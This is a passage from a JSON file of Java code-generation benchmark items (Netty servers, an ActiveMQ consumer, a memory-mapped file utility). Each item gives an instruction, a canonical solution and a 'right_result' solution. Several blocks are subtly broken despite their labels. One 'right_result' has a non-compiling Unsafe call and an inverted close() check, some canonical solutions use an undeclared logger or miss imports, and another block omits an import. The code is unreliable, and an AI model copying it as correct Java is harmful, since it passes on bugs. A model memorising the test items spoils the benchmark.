    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\n\npublic class FileServer {\n\n    public void run(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 100)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(\n                            new StringEncoder(CharsetUtil.UTF_8),\n                            new LineBasedFrameDecoder(1024),\n                            new StringDecoder(CharsetUtil.UTF_8),\n                            new FileServerHandler());\n                    }\n                });\n            ChannelFuture f = b.bind(port).sync();\n            System.out.println(\"Server start at port : \" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = 8082;\n        if (args.length > 0) {\n            try {\n                port = Integer.parseInt(args[0]);\n            } catch (NumberFormatException e) {\n                e.printStackTrace();\n            }\n        }\n        new FileServer().run(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class FileServer {\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private int port;\n\n    public void run(int port) throws Exception {\n        this.port = port;\n        bossGroup = new NioEventLoopGroup();\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new StringDecoder());\n                     p.addLast(new StringEncoder());\n                     p.addLast(new FileServerHandler());\n                 }\n             });\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public static void main(String[] args) {\n        int port = 8082;\n        if (args.length > 0) {\n            port = Integer.parseInt(args[0]);\n        }\n\n        try {\n            new FileServer().run(port);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 2,
    "Instruction": "Task Description: Implement a Java class that consumes messages from an ActiveMQ broker, supporting both queue and topic message consumption patterns. The class should handle connection management and provide clean resource cleanup.\n\nClass Description: JmsConsumer is a Java class that connects to an ActiveMQ message broker to consume messages from either a queue or a topic. It manages the entire JMS connection lifecycle including connection establishment, session creation, message consumption, and resource cleanup.\n\nAttributes:\n- USERNAME: [String] - Default username for ActiveMQ connection\n- PASSWORD: [String] - Default password for ActiveMQ connection\n- BROKEURL: [String] - Default broker URL for ActiveMQ connection\n- connectionFactory: [ConnectionFactory] - Factory for creating JMS connections\n- connection: [Connection] - Active connection to the message broker\n- session: [Session] - JMS session for message processing\n- destination: [Destination] - Target queue or topic for message consumption\n- messageConsumer: [MessageConsumer] - Consumer instance for receiving messages\n\nMethods:\n- consumeQueueMessages() -> [void] - Consumes messages from a specified queue (\"SAMPLE_MQ_QUEUE\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- consumeTopicMessages() -> [void] - Consumes messages from a specified topic (\"SAMPLE_MQ_TOPIC\") and prints them to console. Runs indefinitely until no messages are received for the timeout period.\n- closeConnection() -> [void] - Closes the JMS connection and releases all resources. Should be called when message consumption is complete.",
    "Canonical_solution": "import javax.jms.Connection;\nimport javax.jms.ConnectionFactory;\nimport javax.jms.Destination;\nimport javax.jms.JMSException;\nimport javax.jms.MessageConsumer;\nimport javax.jms.Session;\nimport javax.jms.TextMessage;\nimport org.apache.activemq.ActiveMQConnection;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n\n    private static final String USERNAME = ActiveMQConnection.DEFAULT_USER;\n    private static final String PASSWORD = ActiveMQConnection.DEFAULT_PASSWORD;\n    private static final String BROKEURL = ActiveMQConnection.DEFAULT_BROKER_URL;\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKEURL);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = session.createQueue(\"SAMPLE_MQ_QUEUE\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"QUEUE\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void consumeTopicMessages() throws JMSException {\n        destination = session.createTopic(\"SAMPLE_MQ_TOPIC\");\n        messageConsumer = session.createConsumer(destination);\n        \n        while (true) {\n            TextMessage textMessage = (TextMessage) messageConsumer.receive(100000);\n            if (textMessage != null) {\n                System.out.println(\"TOPIC\\t\u6536\u5230\u7684\u6d88\u606f:\" + textMessage.getText());\n            } else {\n                break;\n            }\n        }\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            try {\n                connection.close();\n            } catch (JMSException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 39,
    "right_result": "```java\nimport javax.jms.*;\nimport org.apache.activemq.ActiveMQConnectionFactory;\n\npublic class JmsConsumer {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"admin\";\n    private static final String BROKERURL = \"tcp://localhost:61616\";\n\n    private ConnectionFactory connectionFactory;\n    private Connection connection;\n    private Session session;\n    private Destination destination;\n    private MessageConsumer messageConsumer;\n\n    public void consumeQueueMessages() throws JMSException {\n        connect(\"queue\", \"SAMPLE_MQ_QUEUE\");\n        while (true) {\n            TextMessage message = (TextMessage) messageConsumer.receive(1000);\n            if (message == null) break;\n            System.out.println(\"Received message: \" + message.getText());\n        }\n        closeConnection();\n    }\n\n    public void consumeTopicMessages() throws JMSException {\n        connect(\"topic\", \"SAMPLE_MQ_TOPIC\");\n        while (true) {\n            TextMessage message = (TextMessage) messageConsumer.receive(1000);\n            if (message == null) break;\n            System.out.println(\"Received message: \" + message.getText());\n        }\n        closeConnection();\n    }\n\n    private void connect(String type, String name) throws JMSException {\n        connectionFactory = new ActiveMQConnectionFactory(USERNAME, PASSWORD, BROKERURL);\n        connection = connectionFactory.createConnection();\n        connection.start();\n        session = connection.createSession(false, Session.AUTO_ACKNOWLEDGE);\n        destination = type.equals(\"queue\") ? session.createQueue(name) : session.createTopic(name);\n        messageConsumer = session.createConsumer(destination);\n    }\n\n    private void closeConnection() {\n        try {\n            if (messageConsumer != null) messageConsumer.close();\n            if (session != null) session.close();\n            if (connection != null) connection.close();\n        } catch (JMSException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Java class that provides memory-mapped file access capabilities and process spawning functionality for inter-process communication scenarios.\n\nClass Description: FileChannelInteractor is a utility class that handles memory-mapped file operations and process management. It allows read-only memory mapping of files and provides functionality to spawn worker processes for IPC scenarios.\n\nAttributes:\n- fileChannel: FileChannel - The NIO FileChannel used for file operations\n- mapAddress: long - The memory address of the mapped file region\n- fileSize: long - The size of the mapped file in bytes\n\nMethods:\n- FileChannelInteractor(String filePath) -> void - Constructor that opens a file channel and maps the file into memory in read-only mode\n- getMemoryMappedAddress() -> long - Returns the memory address of the mapped file region\n- getFileSize() -> long - Returns the size of the mapped file\n- close() -> void - Closes the file channel and releases system resources\n- spawnWorkerProcess() -> void - Static method that spawns a worker process with the same command and arguments as the current process, adding a \"--worker\" flag",
    "Canonical_solution": "import java.io.IOException;\nimport java.lang.foreign.Arena;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        this.fileChannel = FileChannel.open(Path.of(filePath), StandardOpenOption.READ);\n        this.fileSize = fileChannel.size();\n        this.mapAddress = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize, Arena.global()).address();\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        fileChannel.close();\n    }\n\n    public static void spawnWorkerProcess() throws IOException {\n        ProcessHandle.Info info = ProcessHandle.current().info();\n        ArrayList<String> workerCommand = new ArrayList<>();\n        info.command().ifPresent(workerCommand::add);\n        info.arguments().ifPresent(args -> workerCommand.addAll(Arrays.asList(args)));\n        workerCommand.add(\"--worker\");\n        new ProcessBuilder()\n                .command(workerCommand)\n                .inheritIO()\n                .redirectOutput(ProcessBuilder.Redirect.PIPE)\n                .start()\n                .getInputStream()\n                .transferTo(System.out);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.MappedByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.StandardOpenOption;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private long mapAddress;\n    private long fileSize;\n\n    public FileChannelInteractor(String filePath) throws IOException {\n        File file = new File(filePath);\n        this.fileChannel = FileChannel.open(file.toPath(), StandardOpenOption.READ);\n        this.fileSize = file.length();\n        MappedByteBuffer buffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);\n        this.mapAddress = ((sun.misc.Unsafe) java.lang.reflect.Field.get(sun.misc.Unsafe.class.getDeclaredField(\"theUnsafe\")).setAccessible(true).get(null)).addressOf(buffer);\n    }\n\n    public long getMemoryMappedAddress() {\n        return mapAddress;\n    }\n\n    public long getFileSize() {\n        return fileSize;\n    }\n\n    public void close() throws IOException {\n        if (fileChannel != null && !fileChannel.isOpen()) {\n            fileChannel.close();\n        }\n    }\n\n    public static void spawnWorkerProcess() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(new String[]{\"java\", \"-cp\", System.getProperty(\"java.class.path\"), FileChannelInteractor.class.getName()});\n            pb.command().add(\"--worker\");\n            pb.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 200,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework for handling client connections and message passing in a chat application.\n\nClass Description: The CIMServer class is a Spring component that initializes and manages a Netty-based TCP server. It handles client connections, maintains session information, and provides functionality to send messages to connected clients.\n\nAttributes:\n- boss: [EventLoopGroup] - Handles incoming connections and distributes them to worker threads\n- work: [EventLoopGroup] - Handles I/O operations for established connections\n- nettyPort: [int] - The port number on which the server listens for incoming connections\n\nMethods:\n- start(): [void]() -> [void] - Initializes and starts the Netty server (annotated with @PostConstruct)\n- destroy(): [void]() -> [void] - Shuts down the server gracefully (annotated with @PreDestroy)\n- sendMsg(): [void]([SendMsgReqVO sendMsgReqVO]) -> [void] - Sends a message to a specific client identified by user ID",
    "Canonical_solution": "import com.crossoverjie.cim.common.protocol.BaseCommand;\nimport com.crossoverjie.cim.common.protocol.Request;\nimport com.crossoverjie.cim.server.api.vo.req.SendMsgReqVO;\nimport com.crossoverjie.cim.server.init.CIMServerInitializer;\nimport com.crossoverjie.cim.server.util.SessionSocketHolder;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport jakarta.annotation.PostConstruct;\nimport jakarta.annotation.PreDestroy;\nimport java.net.InetSocketAddress;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss = new NioEventLoopGroup();\n    private EventLoopGroup work = new NioEventLoopGroup();\n\n    @Value(\"${cim.server.port}\")\n    private int nettyPort;\n\n    @PostConstruct\n    public void start() throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap()\n                .group(boss, work)\n                .channel(NioServerSocketChannel.class)\n                .localAddress(new InetSocketAddress(nettyPort))\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .childHandler(new CIMServerInitializer());\n\n        ChannelFuture future = bootstrap.bind().sync();\n        if (future.isSuccess()) {\n            log.info(\"Start cim server success!!!\");\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        boss.shutdownGracefully().syncUninterruptibly();\n        work.shutdownGracefully().syncUninterruptibly();\n        log.info(\"Close cim server success!!!\");\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        NioSocketChannel socketChannel = SessionSocketHolder.get(sendMsgReqVO.getUserId());\n\n        if (null == socketChannel) {\n            log.error(\"client {} offline!\", sendMsgReqVO.getUserId());\n            return;\n        }\n        Request protocol = Request.newBuilder()\n                .setRequestId(sendMsgReqVO.getUserId())\n                .setReqMsg(sendMsgReqVO.getMsg())\n                .putAllProperties(sendMsgReqVO.getProperties())\n                .setCmd(BaseCommand.MESSAGE)\n                .build();\n\n        ChannelFuture future = socketChannel.writeAndFlush(protocol);\n        future.addListener((ChannelFutureListener) channelFuture ->\n                log.info(\"server push msg:[{}]\", sendMsgReqVO.toString()));\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class CIMServer {\n\n    private EventLoopGroup boss;\n    private EventLoopGroup work;\n    private int nettyPort;\n\n    public CIMServer(int nettyPort) {\n        this.nettyPort = nettyPort;\n        this.boss = new NioEventLoopGroup();\n        this.work = new NioEventLoopGroup();\n    }\n\n    @PostConstruct\n    public void start() {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(boss, work)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 // Add necessary handlers for message processing\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        try {\n            ChannelFuture f = b.bind(nettyPort).sync();\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n        } finally {\n            work.shutdownGracefully();\n            boss.shutdownGracefully();\n        }\n    }\n\n    @PreDestroy\n    public void destroy() {\n        if (!work.isShutdown()) {\n            work.shutdownGracefully();\n        }\n        if (!boss.isShutdown()) {\n            boss.shutdownGracefully();\n        }\n    }\n\n    public void sendMsg(SendMsgReqVO sendMsgReqVO) {\n        // Logic to find the channel associated with the user ID and send the message\n    }\n}\n```"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle multiple client connections and manage them through a channel group.\n\nClass Description: The ChatServer class is a Netty-based TCP server that manages client connections through channel groups. It provides methods to start the server on a specified address and properly shut it down while releasing all resources.\n\nAttributes:\n- channelGroup: [ChannelGroup] - Maintains all active client channels for group operations\n- bossGroup: [EventLoopGroup] - Handles incoming connection requests\n- workGroup: [EventLoopGroup] - Handles I/O operations for established connections\n- channel: [Channel] - Represents the server's listening channel\n\nMethods:\n- start: [Name]([InetSocketAddress address]) -> [ChannelFuture] - Starts the server on the specified address, configures server options, and initializes the channel pipeline with handlers\n- destroy: [Name]() -> [void] - Properly shuts down the server by closing all channels and releasing thread resources",
    "Canonical_solution": "import java.net.InetSocketAddress;\n\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.ImmediateEventExecutor;\n\npublic class ChatServer {\n    private final ChannelGroup channelGroup = new DefaultChannelGroup(ImmediateEventExecutor.INSTANCE);\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n    \n    public ChannelFuture start(InetSocketAddress address) {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChatServerInitializer(channelGroup))\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n        \n        ChannelFuture future = bootstrap.bind(address).syncUninterruptibly();\n        channel = future.channel();\n        return future;\n    }\n    \n    public void destroy() {\n        if(channel != null) {\n            channel.close();\n        }\n        \n        channelGroup.close();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.util.concurrent.GlobalEventExecutor;\n\npublic class ChatServer {\n    private ChannelGroup channelGroup = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n    private EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private EventLoopGroup workGroup = new NioEventLoopGroup();\n    private Channel channel;\n\n    public ChannelFuture start(InetSocketAddress address) throws Exception {\n        ServerBootstrap b = new ServerBootstrap();\n        b.group(bossGroup, workGroup)\n         .channel(NioServerSocketChannel.class)\n         .childHandler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             protected void initChannel(SocketChannel ch) throws Exception {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new ChatServerHandler(channelGroup));\n             }\n         })\n         .option(ChannelOption.SO_BACKLOG, 128)\n         .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        return b.bind(address).sync().addListener(future -> {\n            if (future.isSuccess()) {\n                System.out.println(\"ChatServer started successfully.\");\n            } else {\n                future.cause().printStackTrace();\n            }\n        });\n    }\n\n    public void destroy() {\n        channelGroup.close().awaitUninterruptibly();\n        workGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n        System.out.println(\"ChatServer shutdown gracefully.\");\n    }\n}\n```"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that listens for incoming connections, processes command-based requests, and returns appropriate responses. The server should support multiple commands and maintain a clean connection lifecycle.\n\nClass Description: Console is a singleton class that implements a TCP server with command processing capabilities. It maintains a registry of available commands and handles client connections using Netty's NIO framework.\n\nAttributes:\n- instance: Console - Singleton instance of the Console class\n- commands: Map<String, Class> - Registry mapping command strings to their respective Command classes\n\nMethods:\n- getInstance() -> Console - Returns the singleton instance of Console, initializing it with default commands if not already created\n- listenOnTCP(int port) -> void - Starts a TCP server on the specified port using Netty framework\n- Adapter: ChannelInboundHandlerAdapter - Inner class handling channel events and command processing\n  - channelRead(ChannelHandlerContext ctx, Object msg) -> void - Processes incoming messages as commands\n  - channelActive(ChannelHandlerContext ctx) -> void - Handles new connection initialization\n  - channelReadComplete(ChannelHandlerContext ctx) -> void - Handles post-read operations\n  - sendStringL(ChannelHandlerContext ctx, String text) -> void - Sends string with newline if missing\n  - sendString(ChannelHandlerContext ctx, String text) -> void - Sends string to client\n  - sendPrompt(ChannelHandlerContext ctx) -> void - Sends command prompt to client\n- Command: abstract static class - Base class for all command implementations\n  - Command(String command) - Constructor taking the command string\n  - execute() -> String - Abstract method to be implemented by concrete commands\n- HelpCommand: static class extends Command - Implements help command\n  - HelpCommand(String command) - Constructor\n  - execute() -> String - Returns help message\n- HelloCommand: static class extends Command - Implements hello command\n  - HelloCommand(String command) - Constructor\n  - execute() -> String - Returns random greeting message\n- DeviceCommand: static class extends Command - Implements device command\n  - DeviceCommand(String command) - Constructor\n  - execute() -> String - Returns device information in JSON format",
    "Canonical_solution": "import com.yeetor.androidcontrol.server.BaseServer;\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.ByteBuf;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.lang.reflect.Constructor;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Console {\n\n    private static Console instance;\n    private Map<String, Class> commands;\n\n    public static Console getInstance() {\n        if (instance == null) {\n            instance = new Console();\n            instance.commands = new HashMap<>();\n            instance.commands.put(\"help\", HelpCommand.class);\n            instance.commands.put(\"hello\", HelloCommand.class);\n            instance.commands.put(\"device\", DeviceCommand.class);\n        }\n        return instance;\n    }\n\n    public void listenOnTCP(int port) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup).channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        public void initChannel(SocketChannel ch) throws Exception {\n                            ch.pipeline().addLast(new Adapter());\n                        }\n                    }).option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port);\n            f.channel().closeFuture().sync();\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    class Adapter extends ChannelInboundHandlerAdapter {\n        \n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n            ByteBuf buf = (ByteBuf) msg;\n            byte[] res = new byte[buf.readableBytes()];\n            buf.readBytes(res);\n            buf.release();\n            \n            String str = new String(res).trim();\n            \n            Class cls = commands.get(str);\n            if (cls != null) {\n                Constructor constructor = cls.getDeclaredConstructor(String.class);\n                constructor.setAccessible(true);\n                Command command = (Command) constructor.newInstance(str);\n                sendStringL(ctx, command.execute());\n            } else {\n                sendString(ctx, \"command not found\\n\");\n            }\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) throws Exception {\n            sendString(ctx, \"help \u5e2e\u52a9\u63d0\u793a\\r\\nhello \u4eba\u751f\u683c\u8a00\\r\\n\");\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) throws Exception {\n            sendPrompt(ctx);\n        }\n        \n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            if (!text.endsWith(\"\\n\")) {\n                text += \"\\n\";\n            }\n            sendString(ctx, text);\n        }\n        \n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ByteBuf encoded = ctx.alloc().buffer(4 * text.length());\n            encoded.writeBytes(text.getBytes());\n            ctx.write(encoded);\n            ctx.flush();\n        }\n        \n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendString(ctx, \"> \");\n        }\n    }\n\n    public abstract static class Command {\n        private String command;\n        public Command(String command) {\n            this.command = command;\n        }\n        public abstract String execute();\n    }\n\n    public static class HelpCommand extends Command {\n        HelpCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return \"\u6682\u65f6\u6ca1\u6709\u5e2e\u52a9\uff01\";\n        }\n    }\n\n    public static class HelloCommand extends Command {\n        String[] strings = new String[] {\n                \"Talking is cheap, show me the code!\",\n                \"\u652f\u6301\u4f5c\u8005<http://yeetor.com>\"\n        };\n        HelloCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return strings[new java.util.Random().nextInt(strings.length)];\n        }\n    }\n\n    public static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n        @Override\n        public String execute() {\n            return BaseServer.getDevicesJSON();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class Console {\n    private static Console instance;\n    private final Map<String, Class<? extends Command>> commands = new HashMap<>();\n\n    public static Console getInstance() {\n        if (instance == null) {\n            synchronized (Console.class) {\n                if (instance == null) {\n                    instance = new Console();\n                    instance.initializeCommands();\n                }\n            }\n        }\n        return instance;\n    }\n\n    private void initializeCommands() {\n        commands.put(\"help\", HelpCommand.class);\n        commands.put(\"hello\", HelloCommand.class);\n        commands.put(\"device\", DeviceCommand.class);\n    }\n\n    public void listenOnTCP(int port) throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 public void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new Adapter());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 128)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(port).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    private class Adapter extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            String input = (String) msg;\n            String[] parts = input.split(\"\\\\s+\");\n            if (!parts[0].isEmpty()) {\n                try {\n                    Class<? extends Command> cmdClass = commands.get(parts[0]);\n                    if (cmdClass != null) {\n                        Command cmd = cmdClass.getDeclaredConstructor(String.class).newInstance(input);\n                        ctx.writeAndFlush(cmd.execute() + \"\\n\");\n                    } else {\n                        ctx.writeAndFlush(\"Unknown command\\n\");\n                    }\n                } catch (Exception e) {\n                    ctx.writeAndFlush(\"Error executing command: \" + e.getMessage() + \"\\n\");\n                }\n            }\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            sendPrompt(ctx);\n        }\n\n        @Override\n        public void channelReadComplete(ChannelHandlerContext ctx) {\n            ctx.flush();\n        }\n\n        private void sendStringL(ChannelHandlerContext ctx, String text) {\n            ctx.write(text.endsWith(\"\\n\") ? text : text + \"\\n\");\n        }\n\n        private void sendString(ChannelHandlerContext ctx, String text) {\n            ctx.write(text);\n        }\n\n        private void sendPrompt(ChannelHandlerContext ctx) {\n            sendStringL(ctx, \"> \");\n        }\n    }\n\n    public abstract static class Command {\n        protected final String command;\n\n        public Command(String command) {\n            this.command = command;\n        }\n\n        public abstract String execute();\n    }\n\n    public static class HelpCommand extends Command {\n        public HelpCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            return \"Available commands: help, hello, device\";\n        }\n    }\n\n    public static class HelloCommand extends Command {\n        public HelloCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            String[] parts = command.split(\"\\\\s+\", 2);\n            String name = parts.length > 1 ? parts[1] : \"Guest\";\n            return \"Hello, \" + name + \"!\";\n        }\n    }\n\n    public static class DeviceCommand extends Command {\n        public DeviceCommand(String command) {\n            super(command);\n        }\n\n        @Override\n        public String execute() {\n            // Simulate device info retrieval\n            return \"{\\\"device\\\": \\\"SimulatedDevice\\\", \\\"version\\\": \\\"1.0\\\"}\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 203,
